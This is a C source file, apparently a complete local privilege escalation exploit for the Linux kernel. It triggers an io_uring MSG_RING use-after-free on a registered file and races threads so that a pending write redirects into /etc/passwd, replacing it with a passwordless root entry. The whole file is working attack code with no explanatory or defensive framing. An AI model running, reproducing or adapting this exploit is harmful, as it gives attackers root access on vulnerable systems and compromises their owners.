// gcc t1dexp.c -o t1dexp -static -no-pie -s -luring

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <liburing.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syscall.h>
#include <linux/kcmp.h>
#include <pthread.h>

#define QUEUE_DEPTH 64
#define BLOCK_SZ 1024
#define IORING_OP_MSG_RING 40
#define DATASIZE 0x20000000


const char* colorGreen = "\033[1;32m";
const char* colorRed = "\033[1;31m";
const char* colorReset = "\033[0m";
const char* testfile = "/tmp/test";
const char* attackfile = "/etc/passwd";
const char* attack_data = "root::0:0:root:/root:/bin/sh\n";

int test_fd;
int attack_fd;

pthread_spinlock_t lock_for_write;
pthread_spinlock_t lock_for_uaf;

void myDbgputs(char* message){
    printf("[%s+%s] %s\n", colorGreen, colorReset, message);
}

void myErrputs(char* message){
    printf("[%sx%s] %s\n", colorGreen, colorReset, message);
}

void testuaf() {
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    char buffer[BLOCK_SZ];
    io_uring_queue_init(QUEUE_DEPTH, &ring, 0);
    io_uring_register_files(&ring, &test_fd, 1);
    
    for(int i = 0; i<3; i++)
    {
        sqe = io_uring_get_sqe(&ring);
        sqe->flags = IOSQE_FIXED_FILE;
        sqe->opcode = IORING_OP_MSG_RING;
        sqe->fd = 0;
        io_uring_submit(&ring);
    }
    io_uring_submit(&ring);
    sleep(1);
    myDbgputs("Finish UAF");
}

void *pthread_for_write_useless() {
    int fd = open(testfile, O_WRONLY);
    void *addr = mmap(NULL, DATASIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    pthread_spin_unlock(&lock_for_write);
    myDbgputs("Begin write large data");
    write(fd, addr, DATASIZE);
    myDbgputs("Finish write large data");
}

void *pthread_for_write_attackfile() {
    pthread_spin_lock(&lock_for_write);
    pthread_spin_unlock(&lock_for_uaf);
    myDbgputs("Begin write attack file");
    write(test_fd, attack_data, 30);
    myDbgputs("Finish write attack file");
}

void *do_uaf() {
    pthread_spin_lock(&lock_for_uaf);
    myDbgputs("Begin UAF");
    testuaf();
    attack_fd = open(attackfile, O_RDONLY);
    if(syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, test_fd, attack_fd) != 0){
        myErrputs("Not the expected address");
        exit(-1);
    }
}

void initfirst()
{
    pthread_spin_init(&lock_for_write, 0);
    pthread_spin_init(&lock_for_uaf, 0);
    pthread_spin_lock(&lock_for_write);
    pthread_spin_lock(&lock_for_uaf);
}

void destory()
{
    pthread_spin_destroy(&lock_for_uaf);
    pthread_spin_destroy(&lock_for_write);
}

int main(int argc, char *argv[]) {
    char buf[0x100];
    pthread_t p1, p2;
    initfirst();
    int fd = open(testfile, O_CREAT | O_WRONLY, 0777);
    close(fd);
    test_fd = open(testfile, O_WRONLY);
    sprintf((char *)buf, "fd: %d", test_fd);
    myDbgputs(buf);
    pthread_create(&p1, NULL, pthread_for_write_useless, NULL);
    pthread_create(&p2, NULL, pthread_for_write_attackfile, NULL);
    do_uaf();
    pthread_join(p1, NULL);
    pthread_join(p2, NULL);
    destory();
    return 0;
}
